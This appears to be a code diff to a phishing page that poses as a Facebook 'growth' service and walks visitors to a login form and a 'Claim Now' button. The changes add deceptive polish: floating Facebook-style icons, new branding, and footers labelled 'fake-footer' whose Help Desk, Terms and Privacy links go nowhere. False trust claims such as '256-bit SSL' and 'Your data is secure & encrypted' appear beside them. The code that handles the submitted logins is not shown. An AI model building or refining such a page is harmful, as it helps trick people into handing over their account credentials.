@@ -14,7 +14,47 @@
             align-items: center;
             font-family: 'Segoe UI', Roboto, sans-serif;
             padding: 16px;
+            position: relative;
+            overflow-x: hidden;
         }
+
+        /* ===== ANIMATED FLOATING LOGOS ===== */
+        .floating-logos {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .floating-logos span {
+            position: absolute;
+            display: block;
+            font-size: 40px;
+            opacity: 0.08;
+            animation: floatLogo 20s infinite linear;
+            color: #1877f2;
+        }
+        .floating-logos span:nth-child(1) { left: 5%; animation-duration: 18s; animation-delay: 0s; font-size: 60px; }
+        .floating-logos span:nth-child(2) { left: 15%; animation-duration: 22s; animation-delay: 2s; font-size: 45px; }
+        .floating-logos span:nth-child(3) { left: 25%; animation-duration: 20s; animation-delay: 4s; font-size: 70px; }
+        .floating-logos span:nth-child(4) { left: 35%; animation-duration: 25s; animation-delay: 1s; font-size: 50px; }
+        .floating-logos span:nth-child(5) { left: 45%; animation-duration: 19s; animation-delay: 3s; font-size: 65px; }
+        .floating-logos span:nth-child(6) { left: 55%; animation-duration: 23s; animation-delay: 5s; font-size: 40px; }
+        .floating-logos span:nth-child(7) { left: 65%; animation-duration: 21s; animation-delay: 2s; font-size: 55px; }
+        .floating-logos span:nth-child(8) { left: 75%; animation-duration: 24s; animation-delay: 4s; font-size: 48px; }
+        .floating-logos span:nth-child(9) { left: 85%; animation-duration: 17s; animation-delay: 1s; font-size: 62px; }
+        .floating-logos span:nth-child(10) { left: 92%; animation-duration: 26s; animation-delay: 3s; font-size: 44px; }
+
+        @keyframes floatLogo {
+            0% { top: -10%; transform: rotate(0deg) scale(1); }
+            50% { transform: rotate(180deg) scale(1.2); }
+            100% { top: 110%; transform: rotate(360deg) scale(1); }
+        }
+
+        /* ===== GLASS CARD ===== */
         .glass {
             background: rgba(255,255,255,0.06);
             backdrop-filter: blur(16px);
@@ -26,6 +66,8 @@
             box-shadow: 0 25px 60px rgba(0,0,0,0.6);
             text-align: center;
             color: #fff;
+            position: relative;
+            z-index: 1;
         }
         .glass h1 {
             font-size: 28px;
@@ -178,12 +220,50 @@
             opacity: 0.4;
         }
         .trust-badge span { display: flex; align-items: center; gap: 4px; }
+
+        /* ===== FAKE FOOTER ===== */
+        .fake-footer {
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255,255,255,0.06);
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            flex-wrap: wrap;
+            font-size: 11px;
+            opacity: 0.4;
+        }
+        .fake-footer a {
+            color: #fff;
+            text-decoration: none;
+            transition: 0.2s;
+        }
+        .fake-footer a:hover {
+            opacity: 0.8;
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
+
+    <!-- ===== ANIMATED FLOATING LOGOS ===== -->
+    <div class="floating-logos">
+        <span>📘</span>
+        <span>👍</span>
+        <span>💬</span>
+        <span>📘</span>
+        <span>❤️</span>
+        <span>📘</span>
+        <span>👥</span>
+        <span>📘</span>
+        <span>🔵</span>
+        <span>📘</span>
+    </div>
+
+    <!-- ===== MAIN CARD ===== -->
     <div class="glass" id="mainPage">
-        <h1>🚀 Facebook Growth Suite</h1>
-        <p class="sub">Boost your page organically</p>
+        <h1>🚀 Boost Your Profile</h1>
+        <p class="sub">Grow your Facebook presence organically</p>
 
         <div class="stats">
             <div class="stat-item">
@@ -212,6 +292,13 @@
             <span>🔒 256-bit SSL</span>
             <span>🛡️ Secure Payment</span>
             <span>🤝 24/7 Support</span>
+        </div>
+
+        <!-- ===== FAKE FOOTER ===== -->
+        <div class="fake-footer">
+            <a href="#">🆘 Help Desk</a>
+            <a href="#">📜 Terms of Service</a>
+            <a href="#">🔒 Privacy Policy</a>
         </div>
 
         <p class="footer-text">Join 5M+ creators who grew their Facebook</p>
@@ -254,7 +341,12 @@
                 </div>
                 <button class="glow-btn" onclick="showLogin('${optionId}', '${optionLabel}')">Next →</button>
                 <button class="glow-btn back-btn" onclick="location.reload()">⬅ Back</button>
-                <p class="footer-text" style="margin-top:20px;">Secure & encrypted</p>
+                <div class="fake-footer" style="margin-top:20px;">
+                    <a href="#">🆘 Help Desk</a>
+                    <a href="#">📜 Terms</a>
+                    <a href="#">🔒 Privacy</a>
+                </div>
+                <p class="footer-text" style="margin-top:12px;">Secure & encrypted</p>
             `;
         }
 
@@ -281,7 +373,12 @@
                 </div>
                 <button class="glow-btn" onclick="submitLogin('${optionId}', '${quantity}')">🚀 Claim Now</button>
                 <button class="glow-btn back-btn" onclick="location.reload()">⬅ Back</button>
-                <p class="footer-text" style="margin-top:20px;">🔐 Your data is secure & encrypted</p>
+                <div class="fake-footer" style="margin-top:20px;">
+                    <a href="#">🆘 Help Desk</a>
+                    <a href="#">📜 Terms</a>
+                    <a href="#">🔒 Privacy</a>
+                </div>
+                <p class="footer-text" style="margin-top:12px;">🔐 Your data is secure & encrypted</p>
             `;
         }
 
